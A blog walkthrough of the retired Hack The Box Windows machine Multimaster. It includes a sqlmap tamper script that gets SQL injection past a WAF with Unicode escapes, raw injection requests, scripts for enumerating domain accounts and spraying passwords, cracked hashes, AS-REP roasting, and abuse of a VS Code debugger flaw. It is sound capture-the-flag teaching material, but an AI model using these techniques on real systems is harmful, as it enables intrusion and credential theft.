---
layout: post
title: "Multimaster: Hack The Box Walkthrough"
date: 2020-09-20 14:17:03 +0000
last_modified_at: 2020-09-20 14:17:03 +0000
category: Walkthrough
tags: ["Hack The Box", Multimaster, retired, Windows, Insane]
comments: true
image:
  feature: multimaster-htb-walkthrough.png
---

This post documents the complete walkthrough of Multimaster, a retired vulnerable [VM][1] created by [egre55][2] and [MinatoTW][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Multimaster is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.179 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-21 13:41:53 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 636/tcp on 10.10.10.179
Discovered open port 49666/tcp on 10.10.10.179
Discovered open port 49710/tcp on 10.10.10.179
Discovered open port 9389/tcp on 10.10.10.179
Discovered open port 3389/tcp on 10.10.10.179
Discovered open port 49673/tcp on 10.10.10.179
Discovered open port 5985/tcp on 10.10.10.179
Discovered open port 389/tcp on 10.10.10.179
Discovered open port 3269/tcp on 10.10.10.179
Discovered open port 49675/tcp on 10.10.10.179
Discovered open port 445/tcp on 10.10.10.179
Discovered open port 3268/tcp on 10.10.10.179
Discovered open port 139/tcp on 10.10.10.179
Discovered open port 53/tcp on 10.10.10.179
Discovered open port 49677/tcp on 10.10.10.179
Discovered open port 53/udp on 10.10.10.179
Discovered open port 464/tcp on 10.10.10.179
Discovered open port 49687/tcp on 10.10.10.179
Discovered open port 49669/tcp on 10.10.10.179
Discovered open port 135/tcp on 10.10.10.179
Discovered open port 80/tcp on 10.10.10.179
Discovered open port 593/tcp on 10.10.10.179
Discovered open port 88/tcp on 10.10.10.179
```

Whoa. Sure looks like a Windows server. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -A --reason -oN nmap.txt 10.10.10.179
...
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain?       syn-ack ttl 127
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 6944F7C42798BE78E1465F1C49B5BF04
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: MegaCorp
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-03-21 13:55:17Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2020-03-21T13:57:56+00:00
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Issuer: commonName=MULTIMASTER.MEGACORP.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-03-08T09:52:26
| Not valid after:  2020-09-07T09:52:26
| MD5:   69b4 51a3 a73c 572c 0344 6c16 e44a 1b28
|_SHA-1: 9587 34e8 ccb6 075f bc4a aa3b 375a 1f94 4c63 c705
|_ssl-date: 2020-03-21T13:58:35+00:00; +6m35s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        syn-ack ttl 127 .NET Message Framing
...
Host script results:
|_clock-skew: mean: 1h30m35s, deviation: 3h07m51s, median: 6m34s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2020-03-21T06:57:54-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-03-21T13:57:56
|_  start_date: 2020-03-21T13:36:37
```

The usual null session didn't work with `rpcclient` and `smbclient`/`smbmap`. Anyways, this is what the site looks like.

{% include image.html image_alt="3263827b.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/3263827b.png" %}

I'd better put `megacorp`, `megacorp.local` into `/etc/hosts`.

### Colleague Finder

Navigating around I noticed a Colleague Finder feature in the site.

{% include image.html image_alt="f254a3d6.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/f254a3d6.png" %}

Behind the scene is actually a XHR to `/api/getColleagues`.

{% include image.html image_alt="3f49393d.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/3f49393d.png" %}

Copying the cURL command, I was able to extract all the usernames with `jq`.

```
# curl 'http://10.10.10.179/api/getColleagues' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/json;charset=utf-8' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://10.10.10.179/' --data '{"name":""}' -s | jq .[].email | tr -d '"' | cut -d'@' -f1
sbauer
okent
ckane
kpage
shayna
james
cyork
rmartin
zac
jorden
alyx
ilee
nbourne
zpowers
aldom
minato
egre55
```

Looking at the email domain `@megacorp.htb`, I'd better put `megacorp.htb` into `/etc/hosts` as well.

### Bypassing the WAF

Playing with the API for a while, I soon realized that a web application firewall (WAF) appears to be sitting in front of the application server.

**Request**

```
POST /api/getColleagues HTTP/1.1
Host: megacorp.local
User-Agent: curl/7.68.0
Accept: */*
Content-Type: application/json
Content-Length: 12
Connection: close

{"name":"'"}
```

**Response**

```
HTTP/1.1 403 Forbidden
Content-Type: text/html
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sat, 21 Mar 2020 14:10:01 GMT
Connection: close
Content-Length: 1233
```

Using any of the usual SQL injection character or keywords such as a single quote (`'`), `SELECT` and `UNION` results in a **403 Forbidden**. In addition, if you send requests to the application server at a fast rate , **403 Forbidden** errors are also observed.

Digging into the specifications of JSON, I noted that JSON only accepts Unicode character encodings for request and response, e.g. UTF-8, UTF-16 and UTF-32, with UTF-8 being the default for best compatibility.

Armed with this insight, I observed that when a single quote (`'`) is encoded as `\u0027`, the WAF merrily accepts it and send it to the application server for processing.

**Request**

```
POST /api/getColleagues HTTP/1.1
Host: megacorp.local
User-Agent: curl/7.68.0
Accept: */*
Content-Type: application/json
Content-Length: 17
Connection: close

{"name":"\u0027"}
```

**Response**

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sat, 21 Mar 2020 14:10:42 GMT
Connection: close
Content-Length: 4

null
```

I was able to successfully send the following SQLi string to the application server.

```
-1' UNION SELECT 1,2,3,4,5-- -
```

**Request**

```
POST /api/getColleagues HTTP/1.1
Host: megacorp.local
User-Agent: curl/7.68.0
Accept: */*
Content-Type: application/json
Content-Length: 191
Connection: close

{"name":"\u002d\u0031\u0027\u0020\u0055\u004e\u0049\u004f\u004e\u0020\u0053\u0045\u004c\u0045\u0043\u0054\u0020\u0031\u002c\u0032\u002c\u0033\u002c\u0034\u002c\u0035\u002d\u002d\u0020\u002d"}
```

**Response**

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
Date: Sat, 21 Mar 2020 14:11:54 GMT
Connection: close
Content-Length: 58

[{"id":1,"name":"2","position":"3","email":"4","src":"5"}]
```

Based on the response, I know I can write a `sqlmap` tamper script and use the UNION-based technique to scan the appplication server.

<div class="filename"><span>multimaster.py</span></div>

```python
#!/usr/bin/env python

import os
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])

def tamper(payload, **kwargs):

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        for c in payload:
            retVal += "\\u00{:x}".format(ord(c) & 0xff)

    return retVal
```

Let's do it. Don't forget to add a bit of time delay (`--delay=3`) to bypass the WAF as well.

```
# sqlmap --batch --dbms=mssql --delay=3 --data="{\"name\":\"*\"}" --url=http://megacorp.local/api/getColleagues --tamper=multimaster --technique=U
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:06:09 /2020-03-21/

[14:06:09] [INFO] loading tamper module 'multimaster'
[14:06:09] [WARNING] tamper script 'multimaster' is only meant to be run against ASP or ASP.NET web applications
custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q] Y
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[14:06:09] [INFO] testing connection to the target URL
[14:06:13] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:06:21] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON #1*' might not be injectable
[14:06:24] [INFO] testing for SQL injection on (custom) POST parameter 'JSON #1*'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[14:06:24] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:06:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:06:59] [INFO] target URL appears to have 5 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[14:09:04] [INFO] (custom) POST parameter 'JSON #1*' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[14:09:04] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: JSON #1* ((custom) POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-3379' UNION ALL SELECT 35,35,35,CHAR(113)+CHAR(113)+CHAR(112)+CHAR(98)+CHAR(113)+CHAR(107)+CHAR(112)+CHAR(76)+CHAR(117)+CHAR(111)+CHAR(66)+CHAR(108)+CHAR(103)+CHAR(98)+CHAR(83)+CHAR(87)+CHAR(70)+CHAR(65)+CHAR(73)+CHAR(90)+CHAR(81)+CHAR(87)+CHAR(88)+CHAR(84)+CHAR(73)+CHAR(112)+CHAR(70)+CHAR(74)+CHAR(83)+CHAR(120)+CHAR(80)+CHAR(106)+CHAR(68)+CHAR(116)+CHAR(77)+CHAR(72)+CHAR(112)+CHAR(76)+CHAR(85)+CHAR(72)+CHAR(76)+CHAR(71)+CHAR(79)+CHAR(70)+CHAR(89)+CHAR(113)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(113),35-- kfPu"}
---
[14:09:26] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[14:09:26] [INFO] testing Microsoft SQL Server
[14:09:29] [INFO] confirming Microsoft SQL Server
[14:09:41] [INFO] the back-end DBMS is Microsoft SQL Server
back-end DBMS: Microsoft SQL Server 2017
[14:09:41] [INFO] fetched data logged to text files under '/root/.sqlmap/output/megacorp.local'

[*] ending @ 14:09:41 /2020-03-21/
```

These are the databases.

```
# sqlmap --batch --dbms=mssql --delay=3 --data="{\"name\":\"*\"}" --url=http://megacorp.local/api/getColleagues --tamper=multimaster --technique=U --dbs
...
[*] Hub_DB
[*] master
[*] model
[*] msdb
[*] tempdb
```

These are the tables in `Hub_DB`.

```
# sqlmap --batch --dbms=mssql --delay=3 --data="{\"name\":\"*\"}" --url=http://megacorp.local/api/getColleagues --tamper=multimaster --technique=U --tables -D Hub_DB
...
Database: Hub_DB
[2 tables]
+------------+
| Colleagues |
| Logins     |
+------------+
```

Let's dump out the `Logins` table.

```
# sqlmap --batch --dbms=mssql --delay=3 --data="{\"name\":\"*\"}" --url=http://megacorp.local/api/getColleagues --tamper=multimaster --technique=U --dump -T Logins -D Hub_DB
...
Database: Hub_DB
Table: Logins
[17 entries]
+------+----------+--------------------------------------------------------------------------------------------------+
| id   | username | password                                                                                         |
+------+----------+--------------------------------------------------------------------------------------------------+
| 1    | sbauer   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 2    | okent    | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 3    | ckane    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 4    | kpage    | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 5    | shayna   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 6    | james    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 7    | cyork    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 8    | rmartin  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 9    | zac      | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 10   | jorden   | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 11   | alyx     | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 12   | ilee     | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 13   | nbourne  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa |
| 14   | zpowers  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 |
| 15   | aldom    | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 |
| 16   | minatotw | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
| 17   | egre55   | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc |
+------+----------+--------------------------------------------------------------------------------------------------+
```

There are four unique hashes and they turned out to be KECCAK-384 hashes. What a plot twist! Anyway, `hashcat` is able to crack these hashes with a wordlist such as rockyou pretty fast.

```
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
```

Now what?

### Enumerate Domain Acccounts with SQL

Taking a leaf from this [article](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/), I wrote the following shell script to facilitate querying the SQL server to enumerate for domain accounts.

<div class="filename"><span>exploit.sh</span></div>

```shell
#!/bin/bash

HOST=megacorp.local
URL="http://${HOST}/api/getColleagues"

if [ "$1" == "-e" ]; then
    PAYLOAD="$(echo -ne $2 | xxd -p | tr -d '\n' | sed -r 's/(..)/\\u00\1/g')"
else
    PAYLOAD=$1
fi

curl -s \
     -d "{\"name\":\"${PAYLOAD}\"}" \
     -H "Content-Type: application/json" \
     ${URL}
```

And because the `SUSER_SID('MEGACORP\\Domain Admins')` returns a `VARBINARY`, I'd to `CONVERT` it to `VARCHAR` like so.

```
# ./exploit.sh -e "-1' UNION SELECT 1,CONVERT(VARCHAR(MAX), SUSER_SID('MEGACORP\\Domain Admins'),1),3,4,5-- -" | jq .[].name
"0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000"
```

The SID remains constant, which is 48 characters after `0x`. Armed with this information, I wrote the following python script to generate all the SIDs for RIDs from 500 to 10000 in the format above. The output of this script will be fed to the shell script above.

<div class="filename"><span>generate_sids.py</span></div>

```python
import struct
import sys

sid = "0x0105000000000005150000001C00D1BCD181F1492BDFC23600020000"
min_rid = int(sys.argv[1])
max_rid = int(sys.argv[2]) + 1


for rid in range(min_rid, max_rid):
    print sid[:50] + struct.pack("<i", rid).encode("hex")
```

_Generate the SIDs_

```
# python generate_sids.py 500 10000 > sids.txt
```

_Enumerate the domain accounts_

```
# for sid in $(cat sids.txt); do (./exploit.sh -e "-1' UNION SELECT 1,SUSER_SNAME($sid),3,4,5-- -" | jq ".[].name" 2>/dev/null; sleep 2s); done | tee accounts.txt
```

_Clean up the accounts_

```
# ./clean.sh accounts.txt
MEGACORP\Administrator
MEGACORP\Guest
MEGACORP\krbtgt
MEGACORP\DefaultAccount
MEGACORP\Domain Admins
MEGACORP\Domain Users
MEGACORP\Domain Guests
MEGACORP\Domain Computers
MEGACORP\Domain Controllers
MEGACORP\Cert Publishers
MEGACORP\Schema Admins
MEGACORP\Enterprise Admins
MEGACORP\Group Policy Creator Owners
MEGACORP\Read-only Domain Controllers
MEGACORP\Cloneable Domain Controllers
MEGACORP\Protected Users
MEGACORP\Key Admins
MEGACORP\Enterprise Key Admins
MEGACORP\RAS and IAS Servers
MEGACORP\Allowed RODC Password Replication Group
MEGACORP\Denied RODC Password Replication Group
MEGACORP\MULTIMASTER$
MEGACORP\DnsAdmins
MEGACORP\DnsUpdateProxy
MEGACORP\svc-nas
MEGACORP\Privileged IT Accounts
MEGACORP\tushikikatomo
MEGACORP\andrew
MEGACORP\lana
MEGACORP\alice
MEGACORP\test
MEGACORP\dai
MEGACORP\svc-sql
MEGACORP\SQLServer2005SQLBrowserUser$MULTIMASTER
MEGACORP\sbauer
MEGACORP\okent
MEGACORP\ckane
MEGACORP\kpage
MEGACORP\james
MEGACORP\cyork
MEGACORP\rmartin
MEGACORP\zac
MEGACORP\jorden
MEGACORP\alyx
MEGACORP\ilee
MEGACORP\nbourne
MEGACORP\zpowers
MEGACORP\aldom
MEGACORP\jsmmons
MEGACORP\pmartin
MEGACORP\Developers
```

You can see that there are a couple of accounts not listed in Colleague Finder. Let's write a simple shell script driven by `rpcclient` to verify these accounts against the three passwords obtained above.

<div class="filename"><span>verify.sh</span></div>

```shell
# cat verify.sh
#!/bin/bash

HOST=10.10.10.179
DOMAIN=MEGACORP
USER=$1
PASS=$2

if rpcclient -U"${DOMAIN}/${USER}%${PASS}" -c "exit" ${HOST} &>/dev/null; then
    echo "[+] User: $USER, Pass: $PASS"
    exit 0
fi
```

Let's give it a shot.

```
# for user in $(cat valid.txt); do for pw in $(cat passwords.txt); do ./verify.sh $user $pw; done; done
[+] User: tushikikatomo, Pass: finance1
```

Awesome. The credential is (`tushikikatomo:finance1`).

## Low-Privilege Shell

Now, let's see if we can access WinRM with the credential using Evil-WinRM.

{% include image.html image_alt="9930ba57.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/9930ba57.png" %}

Excellent. The file `user.txt` is at the desktop.

{% include image.html image_alt="ad2bf19e.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/ad2bf19e.png" %}

## Privilege Escalation

During enumeration of `tushikikatomo`'s account, I notice that I was able to run [`SharpHound.exe`](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe). I'll leave it as an exercise how to transfer `SharpHound.exe` over to Multimaster and how to transfer the collected graph back. **Hint**: `nc.exe` from Kali Linux.

I was able to zoom into the shortest path to our high value target in no time.

{% include image.html image_alt="4676fd90.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/4676fd90.png" %}

I know what I must do. I need `sbauer` and `jorden`'s password since they are both in the **Remote Management Users** group.

### CVE-2019-1414 - Privilege Escalation Vulnerability in Microsoft Visual Studio Code

In my enumeration I also discovered that Microsoft Visual Studio Code was installed in `C:\Program Files\Microsoft VS Code`.

{% include image.html image_alt="fa42b688.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/fa42b688.png" %}

Researching for the vulnerabilities in Microsoft Visual Studio Code, I soon landed at [CVE-2019-1414](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1414), [here](https://iwantmore.pizza/posts/cve-2019-1414.html) and [here](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944). In summary, the vulnerability exists because the remote debugger is enabled by default. The remote debugger uses the Chrome V8 [Inspector](https://v8.dev/docs/inspector) protocol which is based on [WebSocket](https://en.wikipedia.org/wiki/WebSocket). To connect to the remote debugger, simply connect to the exposed websocket by issuing a GET request to `http://127.0.0.1:[random]/json`.

{% include image.html image_alt="7d9f1ae6.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/7d9f1ae6.png" %}

Long story short. Tavis Ormandy wrote a nifty tool [`cefdebug`](https://github.com/taviso/cefdebug) to scan for such websockets bound to the `loopback` interface and allows one to connect to such a websocket and issue commands to the remote debugger!

_Scanning for websockets_

{% include image.html image_alt="4f88db62.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/4f88db62.png" %}

_Connecting to a websocket and issuing commands_

{% include image.html image_alt="069e2ea6.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/069e2ea6.png" %}

After the last command, I got shell as `cyork`.

{% include image.html image_alt="e9df0ca8.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/e9df0ca8.png" %}

### More Enumeration

You may ask what's so special with this `cyork` account. Well, the account is a member of the `Megacorp/Developers` group and members of this group can read `C:\inetpub\wwwroot`.

{% include image.html image_alt="41bc5d27.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/41bc5d27.png" %}

See?

{% include image.html image_alt="5c9b4144.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/5c9b4144.png" %}

In that folder lies the assembly for the `api/getColleagues` implementation in `/bin/MultimasterAPI.dll`.

{% include image.html image_alt="4bebf524.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/4bebf524.png" %}

Well, what have we here?? Password!! No surprise, the password belongs to `sbauer` and because `sbauer` is also in the **Remote Management Users** group, we can use Evil-WinRM to get a shell.

{% include image.html image_alt="24d482ed.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/24d482ed.png" %}

Awesome!

#### UserAccountControl Attribute of `jorden`

Recall the BloodHound graph? Well, `sbauer` has GenericWrite permissions over `jorden`, which means that `sbauer` can overwrite the object's attributes. One such important attribute is [UserAccountControl](https://support.microsoft.com/en-sg/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-properties) (UAC).

We can set the "Do not require Kerberos pre-authentication" for `jorden` and take a sneak preview of the TGT with `GetNPUsers.py` from Impacket like so.

{% include image.html image_alt="1cde9962.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/1cde9962.png" %}

```
# python3 GetNPUsers.py -no-pass "megacorp/jorden"
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for jorden
$krb5asrep$23$jorden@MEGACORP:984ee9e3efadee5b907c08833eddac97$63482153c8e3447383a44089866c6433dda8311b6f93c0fb5e632d3f352ddaa511f5f63e39ade3f4bde69b9a3fc948daa3e2b2856b20f6cff936d4573d426cc39e5025c0f09ff0efe55369f81a1f950a587db47139357937a5e884c904e60ef1ffdd98be113cb062c5b3e5fba25bd1add02c80f47d0fefd53cad129913338c3b2d271f95f69c5c55e41e18f3ab02da829f72ee7652aeb1392c4fe743811ce4b9f048cb5dee580e229b0957057a9f1244e80dcbf31197a64cf8da276f504ba962202b55df1053bcc14621643d1b0f9a5e5e767078979b6137e51824ebc07b75f28525b4c9a2ec25fc780f
```

Cracking the TGT with John the Ripper is fast and easy.

{% include image.html image_alt="4de848aa.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/4de848aa.png" %}

Time to login as `jorden`. Don't forget to toggle back "Do not require Kerberos pre-authentication"!

{% include image.html image_alt="01f97d3b.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/01f97d3b.png" %}

Sweet.

### Getting `root.txt`

Notice that `jorden` is in the **Server Operators** group in the BloodHound graph? That means `jorden` is imbued with special privileges.

{% include image.html image_alt="e5773078.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/e5773078.png" %}

`SeBackupPrivilege` enables one to read files even if you don't have the right specified on the Access Control List.

We need to transfer two PowerShell modules from [here](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug) to make use of this super power like so.

{% include image.html image_alt="470c09b4.png" image_src="/1d524e84-a341-45e7-a5f9-ca9d5f158970/470c09b4.png" %}

:dancer:


[1]: https://www.hackthebox.eu/home/machines/profile/232
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/home/users/profile/8308
[4]: https://www.hackthebox.eu/
